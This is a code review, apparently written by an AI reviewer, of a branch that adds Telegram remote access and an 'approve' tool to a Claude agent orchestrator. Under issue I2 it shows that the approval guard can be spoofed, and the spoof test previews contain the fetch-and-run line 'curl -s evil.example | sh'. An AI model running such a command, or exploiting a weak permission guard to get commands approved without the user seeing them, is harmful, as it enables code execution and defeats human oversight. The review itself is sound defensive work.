# Final whole-branch review: spec 11 remote access (2833b81..bc3aff7)

Reviewer: final (session level), read-only. One pass over the whole diff, then targeted reads of
`tools/lib/approve.zsh`, `tools/lib/telegram.zsh`, `bin/claude-orchestrator`, `bin/tmux-ctl`, `board/server.py`,
the three zsh tests, the fixtures, the docs, and the installed plugin source
(`~/.claude/plugins/cache/claude-plugins-official/telegram/0.0.7/server.ts`).

## Test evidence (run here, at bc3aff7)

| command | result |
|---|---|
| `zsh tools/tests/test_ctl_telegram.zsh` | rc=0, `grep -ac FAIL` = 0, ALL PASS |
| `zsh tools/tests/test_claude_orchestrator_tg.zsh` | rc=0, FAIL = 0, ALL PASS |
| `zsh tools/tests/test_ctl_approve.zsh` | rc=0, FAIL = 0, ALL PASS |
| `python3 -m unittest board.tests.test_telegram_badge … test_terminal_session` (8 modules) | `Ran 218 tests … OK` |

Protected row: `git diff 2833b81..bc3aff7 -- claude/orchestrator.md | grep -c "Carrying out a plan"` = 0. The branch
does not touch the user's locally edited Workflow row.

## Strengths

- `approve` fails closed almost everywhere. It picks only an option labelled exactly `Yes` or `No`. The option rows
  must be the contiguous run right after the *last* question line, and only the `Esc to cancel` footer may follow
  them, so a fake question with options inside a command preview is never used. It re-captures the pane and compares
  before it sends, and `--expect` is mandatory. The parser byte-matches the divider and cursor, so it gives the same
  result in any locale.
- The fixtures are real 2.1.321 captures. The README gives the capture commands, the digit-selection probe and the
  redaction step. The test variants are `sed` edits of real fixtures, not hand-written screens.
- Token handling: stdin only. A token-shaped positional or `--project` is refused without being echoed. The file is
  written under `umask 077` and then `chmod 600`/`700`. The test plants a dummy token and counts its hits across
  every captured output (0).
- Start line: `TG_ARGS` sits right before `AB_ARGS`, which always starts with `--settings`
  (`bin/_ab_claude.zsh:3`), so a positional prompt is never swallowed by the variadic `--channels`. Both exec lines
  are tested. `unset TELEGRAM_STATE_DIR` runs unconditionally, so a value inherited from the caller is cleared
  (tested).
- Board: 17-field format, one `ps -A` per build, and only when a lead pane exists (both tested).

## Issues

### Critical

None.

### Important

**I1. Every `claude` that a Telegram lead starts from its own Bash tool (or from a hook) inherits `TELEGRAM_STATE_DIR`
and takes over the bot: it SIGTERMs the lead's poller.**
`bin/claude-orchestrator:28-30` (export TELEGRAM_STATE_DIR) with plugin `server.ts:27,62-75`.
- What's wrong: the export reaches the lead's whole process tree, not only the lead. The spec (§2) kept it out of the
  tmux session env so that teammates, workers and the overseer never see it. It did not cover the lead's own
  children: Bash tool commands and hooks inherit the claude process env. The plugin's MCP server starts in every
  session where the plugin is enabled, with or without `--channels` (spec "Facts"; this teammate session itself
  lists `plugin:telegram:telegram` as a failed MCP server). On start it reads `bot.pid` in `$TELEGRAM_STATE_DIR`
  and SIGTERMs the holder when that holder's args contain `server.ts`, which the lead's poller does. These children
  would trigger it:
  - a `claude -p` from a skill (skill-creator `run_eval.py`);
  - a real-claude e2e in a scratch tmux server started from the lead's Bash (a new tmux server copies the client env),
    as the Task 3 capture and `e2e-agent-status.md` do;
  - any other `claude` the lead launches.
  After that child exits, nobody polls. The lead silently stops receiving, and the board still shows `tg`, whose
  tooltip already says delivery is not checked.
- Why it matters: the user is remote by definition when this bites, and loses the only channel to the lead with no
  signal.
- Fix: keep the variable in the claude process and drop it for its tool shells. For example, a lead-only
  SessionStart hook (gated on `AGENT_BOARD_LEAD=1`, as the agent-name-guard is) appends `unset TELEGRAM_STATE_DIR`
  to `$CLAUDE_ENV_FILE`, plus a test that a Bash-tool child of the lead sees it unset. At a minimum: an INSTALL rule
  ("a Telegram lead never starts `claude` from its own shell") and an e2e item.
- Evidence status: PLAUSIBLE. It is derived from the plugin source and from env inheritance, and was not run with a
  real token (that needs the real bot). Gate item for the user (add to the e2e checklist): with a paired lead,
  `tmux-ctl telegram status` → note the poller pid. Ask the lead to run `claude -p "say hi"` in its Bash tool, then
  run `status` again. If the pid changed or shows `stopped`, and a phone "ping" no longer arrives, I1 is confirmed.
  A fix should make the pid stay the same.

**I2. `--expect` is a substring match over the whole block, so a different command that contains the approved text
passes the "same prompt" check.** `tools/lib/approve.zsh:56-57`.
- What's wrong: spec §5.3 says the lead presses "only if the same prompt (same tool and command text) is still
  showing". The code accepts the prompt when `--expect` is a substring of everything from the solid divider through
  the options. That span includes the model-written description line and the option labels
  (`Yes, and don’t ask again for: git config *`). I reproduced both cases with `_ap_prompt` from the branch on `sed`
  variants of the real `bash-git.txt`, using `--expect "git config user.name probe-user"`:
  - preview `git config user.name probe-user; curl -s evil.example | sh`: expect PASSES, `O:1:Yes` → digit 1;
  - preview `curl -s evil.example | sh` with the description `Same as git config user.name probe-user`: expect
    PASSES → digit 1.
- Why it matters: this is the one guard between "the user approved #n" and "a different command is pressed Yes". A
  retried or extended command, or the next queued prompt that quotes the approved text, would be approved without
  the user ever seeing it.
- Fix: compare `--expect` only against the preview lines (between the two `╌` rules of a Bash prompt, the file line
  of an Edit/Write prompt), as whole-line equality after trimming. The protocol already says "one distinctive line,
  verbatim" for multi-line commands. Add both variants above as refusal tests.

**I3. e2e item 13 can no longer test what it targets.** `tools/tests/e2e-remote-access.md:19`.
- What's wrong: since d137056, `approve` exits 2 on a missing `--expect` (`approve.zsh:50`) before it reads the
  pane. Item 13 runs `tmux-ctl approve <window> once` with no `--expect` and expects exit 1 `approve: no permission
  prompt`. The user will see the usage error, and the trust-dialog parse is never exercised. This is the only check
  of that dialog, because there is no fixture for it (ledger: "folder-trust refusal not implemented (no fixture)").
- Fix: `tmux-ctl approve <window> once --expect "trust"` (text the dialog shows). Expect exit 1 with
  `no permission prompt` or `no one-time Yes`, and no key sent.

**I4 (promoted from a deferred minor). e2e item 6 can miss exactly the wrong press it guards against.**
`tools/tests/e2e-remote-access.md:12`.
- What's wrong: the item diffs only `.permissions.allow`. The real `bash-touch.txt` prompt's option 2 is "Yes, and
  always allow access to <dir> from this project", which writes a directory grant, not an allow rule. The item's own
  example (a `touch` in a worktree) is the prompt kind most likely to show that row.
- Fix: diff `jq -S '.permissions // {}'`. The cost is one word.

### Minor

- M1. Item 10 tells the user to "capture [step 1] with `2>&1 | tee`", but step 1's command has no tee
  (`e2e-remote-access.md:7,16`). Put the tee in item 1.
- M2. `_tg_token` follows a symlinked `.env`, and an existing `.env` keeps its old mode until the `chmod`
  (`telegram.zsh:45-46`). These are local-user-only risks.
- M3. `approve` does not handle a pane in copy-mode: the digit becomes a copy-mode count, and the re-capture still
  shows the prompt. The result fails safe (nothing is approved), but `approve` still prints `chose "Yes"`
  (`approve.zsh:69-70`).

## Deferred minors: triage (from progress.md)

| minor | before merge? | reason |
|---|---|---|
| T3 after-no-arrows.txt is an excerpt | no | Only used as a no-prompt screen. |
| T3 fixtures from plain claude, not a teammate | no | The README says so. e2e items 6/14 cover real teammate and worker panes. |
| T3 digit probe covered 1 and 4 only | no | 3 (deny on Write) is tested on a replay. The real press is gated by e2e 6/8/14. |
| T1 `claude plugin list \| grep -q` under pipefail (`tmux-ctl:46`) | no | Output is ~30 lines, well under a pipe buffer, so SIGPIPE is unlikely. It affects status only. The real layout was checked here (`claude plugin list`: name line, then `Status: ✔ enabled`). |
| T1 stub ≠ real `plugin list` layout; no enabled check | no | The grep still matches the real layout (checked). A disabled plugin reports `ok`: follow-up. |
| T1 forget says "removed" when none existed | no | Cosmetic. |
| T1 test comment claims a missing check; help assertion hard-codes last line | no | Test hygiene. |
| T1 charset refuses spaces/non-ASCII | no | Now documented in INSTALL. |
| T2 `~/.bun/bin` on PATH for every lead | no | Harmless. |
| T2 bun PATH test position 1 or 2; TC_TELEGRAM=0 + inherited TSD untested | no | The unset is unconditional (`claude-orchestrator:24`), and the `/bogus` test covers it. |
| T2 project name not validated in the launcher | no | The file is only read when `<dir>/.env` exists, and only `tmux-ctl telegram` (validated) writes it. |
| T2 comment placement | no | Cosmetic. |
| T5 badge matches any descendant with the flag in its args | no | Gives a transient false `tg` at worst. Follow-up: argv[0] claude/node. |
| T5 `--channels=` spelling not detected | no | The launcher never writes it. |
| T5 `ps -A` 76–102 ms per uncached build | no, follow-up | Board latency is a known sensitivity: add a short `proc_table` cache in a follow-up, measured on an ephemeral server. |
| T4 `eval "$TC_APPROVE_BEFORE_SEND"` seam in production | no | Setting the env var already means code execution. Removing it is cleaner: follow-up. |
| T4 digit can reach a non-claude pane if the prompt vanishes after re-capture | no | A sub-millisecond window, and a single digit. |
| T4 tests use a single dialog layout | no | Three real layouts (Bash×2, Write). Edit/MCP prompts are gated by the e2e. |
| T4 extra line under the footer reads as "no prompt" | no | Fails closed. The e2e note is in the next row. |
| T6 item 5 "Allow" button name unverified | no | The user sees the buttons. |
| T6 item 6 diffs only `permissions.allow` | **yes**, promoted to I4 | The checklist would miss the always-allow-dir row. |
| T6 step 3 footer parenthetical reads as part of the string | no | Wording. |
| T6 e2e should note what sits under a real teammate's footer | yes, cheap | Fold into the I3/I4 checklist edit. It is the only way to learn whether the footer rule refuses real teammate prompts. |

## Evidence checks

1. **Fixture origin.**
   - approve: real captures (README commands, version, redaction). OK.
   - telegram `access.json`: hand-written (`test_ctl_telegram.zsh:98`), but its keys match the plugin source
     (`server.ts:112-113`, `dmPolicy`, `allowFrom`). Acceptable.
   - `claude plugin list` stub: hand-written single line. The real layout puts the name on its own line, and the grep
     still matches (checked). OK.
   - board rows: hand-written in the server's own 17-field format, with ps stubbed. The T5 report has a real-state
     run on :7710.
   - The trust dialog has no fixture. It is gated by e2e 13, which is broken: see I3.
2. **Artefact under test.**
   - The tests run the deployed `bin/tmux-ctl` and `bin/claude-orchestrator` from the repo.
   - `claude` is stubbed everywhere, and the deciding behaviour (variadic `--channels`) is never run for real. The
     argv order is pinned by tests (`test_claude_orchestrator_tg.zsh:80-87`), and e2e 11 is the named real run with
     its expected output. Accepted.
   - `ps` is patched in the board tests. The real run is in the T5 report. OK.
   - The plugin's MCP startup and pid takeover are not exercised anywhere: see I1.
3. **User-experienced check.** The `tg` badge has no automated visibility check. e2e 12 has the user look in both
   themes. Acceptable for a 1-element badge.
4. **State.**
   - All automated runs use a fresh scratch tmux server and TC_STATE. The telegram test sets a scratch HOME and a
     stub PATH, and the orchestrator test sets `HOME=$RT`. No HOME-hardcoded paths found.
   - Not covered: a long-lived lead that launches `claude` children (I1), and a real teammate pane with extra lines
     under the footer (T4 minor). Both belong to the user gate.
5. **Universal claims.**
   - "Token never printed": a planted dummy was counted across every captured output (`test_ctl_telegram.zsh:140`,
     `grep -c` = 0). zsh has no verbosity modes. The orchestrator test asserts on the single key
     (`show-environment … TELEGRAM_STATE_DIR`), not on the whole env. OK.
   - "Never an always row": rests on exact-label matching over 3 real layouts plus spoof variants. I2 shows that the
     `--expect` guard is weaker than the spec states.
6. **Inputs agents cannot read.**
   - I1's live confirmation needs the real bot (gate command given under I1).
   - Netskope long-poll latency is e2e 3.
   - Neither is a deferred minor: put both as unchecked MR merge-gate items.
7. **Runbook preconditions.**
   - INSTALL names the commands for Bun, the plugin, the token, pairing and the policy, and checks them with
     `tmux-ctl telegram status`. OK.
   - "One live lead per project" is stated, but the doc does not say the lead must not start `claude` itself (I1).
8. **Endpoint trust.** No configurable endpoint (Telegram API host is fixed in the plugin). N/A.

## Recommendations

- Fix I2 in `approve.zsh` (whole-line match within the preview) with two refusal tests. Fix I1 (CLAUDE_ENV_FILE
  unset, lead only), or at least document it and add the gate item. Then edit the e2e checklist for I3, I4 and the
  footer note in one docs commit.
- Follow-ups: a `proc_table` cache, the badge matching argv[0] only, a `plugin: disabled` status, and removing the
  eval seam.

## Assessment

**Ready to merge?** With fixes.

**Reasoning:** the code is careful and well tested against real captures. But `--expect` does not enforce the spec's
"same command" condition (I2). The lead's own shells can silently take over its bot (I1). And two user-gate items
would not catch the failures they target (I3, I4). All four are small, local fixes.
